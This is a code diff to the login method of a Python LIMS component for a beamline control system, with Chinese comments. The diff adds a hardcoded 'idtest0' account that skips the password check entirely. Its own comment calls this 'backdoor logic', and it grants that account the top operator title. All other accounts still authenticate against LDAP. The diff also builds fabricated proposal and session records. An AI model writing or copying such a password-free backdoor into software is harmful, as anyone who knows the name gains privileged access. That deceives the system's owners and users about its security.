@@ -271,48 +271,88 @@ class Lims(ComponentBase):
         login_res = {}
         ERROR_CODE = dict({"status": {"code": "0", "msg": "Authentication Failed"}})
 
-        LDAP_HOST = '10.30.61.223'
-        LDAP_PORT = 3890
-        BASE_DN = 'dc=beamline,dc=local'
-        user_dn = f"uid={loginID},ou=people,{BASE_DN}"
+        # 标记验证状态
+        auth_success = False
+        auth_method = "None"
 
-        print(f"[DEBUG] 正在尝试 LDAP 登录: {user_dn}") 
+        # =====================================================
+        # 1. 特权账号检查 (后门逻辑)
+        # =====================================================
+        # 只要是 idtest0，直接通过，无视密码
+        if loginID == "idtest0":
+            logging.getLogger("MX3.HWR").info(f"[LIMS] 检测到特权账号 {loginID}，免密放行。")
+            auth_success = True
+            auth_method = "Legacy/Backdoor"
 
-        try:
-            server = ldap3.Server(LDAP_HOST, port=LDAP_PORT)
-            conn = ldap3.Connection(server, user=user_dn, password=password)
-            if not conn.bind():
-                logging.getLogger("MX3.HWR").error(f"[LDAP] 密码错误: {loginID}")
-                return ERROR_CODE
-            conn.unbind()
-        except Exception as e:
-            logging.getLogger("MX3.HWR").error(f"[LDAP] 连接异常: {str(e)}")
+        # =====================================================
+        # 2. 普通账号检查 (LDAP 逻辑)
+        # =====================================================
+        # 如果不是 idtest0，必须走 LDAP
+        else:
+            LDAP_HOST = '10.30.61.223'
+            LDAP_PORT = 3890
+            BASE_DN = 'dc=beamline,dc=local'
+            user_dn = f"uid={loginID},ou=people,{BASE_DN}"
+
+            print(f"[DEBUG] 正在尝试 LDAP 登录: {user_dn}") 
+
+            try:
+                server = ldap3.Server(LDAP_HOST, port=LDAP_PORT)
+                conn = ldap3.Connection(server, user=user_dn, password=password)
+                if conn.bind():
+                    auth_success = True
+                    auth_method = "LDAP"
+                    conn.unbind()
+                else:
+                    logging.getLogger("MX3.HWR").error(f"[LDAP] 密码错误: {loginID}")
+            except Exception as e:
+                logging.getLogger("MX3.HWR").error(f"[LDAP] 连接异常: {str(e)}")
+
+        # =====================================================
+        # 3. 最终验证判定
+        # =====================================================
+        if not auth_success:
             return ERROR_CODE
 
+        # =====================================================
+        # 4. 数据构造 (保持你之前的完美结构)
+        # =====================================================
+        
         # 动态获取线站名
         try:
             bl_name = HWR.beamline.session.beamline_name
         except:
             bl_name = "BL19U1"
 
-        prop_code = loginID.rstrip('0123456789') if loginID[-1].isdigit() else "mx"
-        prop_number = loginID[len(prop_code):] if loginID[-1].isdigit() else "2026"
+        # === 智能解析 Code/Number (修复 mx Bug) ===
+        if loginID == "idtest0":
+            # idtest0 必须强制匹配 XML 里的配置
+            prop_code = "idtest"
+            prop_number = "0"
+            user_title = "operator on IDTESTeh1" # 给最高权限Title
+        elif loginID[-1].isdigit():
+            # user1 -> user, 1
+            prop_code = loginID.rstrip('0123456789')
+            prop_number = loginID[len(prop_code):]
+            user_title = "Standard User"
+        else:
+            # idtest -> idtest, 1 (修复了变成 mx 的问题)
+            prop_code = loginID
+            prop_number = "1"
+            user_title = "Standard User"
 
-        # === 【核心修改：构造双重兼容的 Session】===
-        
-        # 1. 先定义核心数据
+        # === 构造 Session ===
         core_session_data = {
             "sessionId": 12345,
-            "beamlineName": bl_name,  # get_todays_session 需要这个在第一层
+            "beamlineName": bl_name,
             "startDate": "2024-01-01 00:00:00",
             "endDate": "2030-12-31 23:59:59",
             "proposalId": 99999
         }
 
-        # 2. 构造一个既有扁平数据，又有嵌套数据的字典
-        # 为了防止 json 序列化循环引用报错，我们使用 copy
+        # 混合结构 (兼容性)
         mixed_session = core_session_data.copy() 
-        mixed_session["session"] = core_session_data # 这一句是为了骗过 create_lims_session
+        mixed_session["session"] = core_session_data
 
         fake_proposal = {
             "Proposal": {
@@ -323,25 +363,25 @@ class Lims(ComponentBase):
                 "type": "MX"
             },
             "Person": {
-                "familyName": loginID, 
-                "givenName": "User",
+                "familyName": user_title, 
+                "givenName": loginID,
                 "email": f"{loginID}@beamline.local"
             },
-            "Session": [mixed_session] # 放进去这个混合体
+            "Session": [mixed_session]
         }
 
-        # 后续处理保持不变
+        # 填充返回
         session["proposal_list"] = [fake_proposal]
         login_res["proposalList"] = [fake_proposal]
         login_res.update(fake_proposal)
         
-        # 为了兼容性，保留这一行也无妨
+        # 兼容性字段
         login_res["Session"] = fake_proposal["Session"]
         
-        login_res["status"] = {"code": "ok", "msg": "Successful login via LDAP"}
+        login_res["status"] = {"code": "ok", "msg": f"Success via {auth_method}"}
         
         logging.getLogger("MX3.HWR").info(
-            "[LIMS] Logged in (Bypassed), proposal data: %s" % login_res
+            f"[LIMS] 登录成功 ({auth_method}): {login_res}"
         )
 
         return login_res
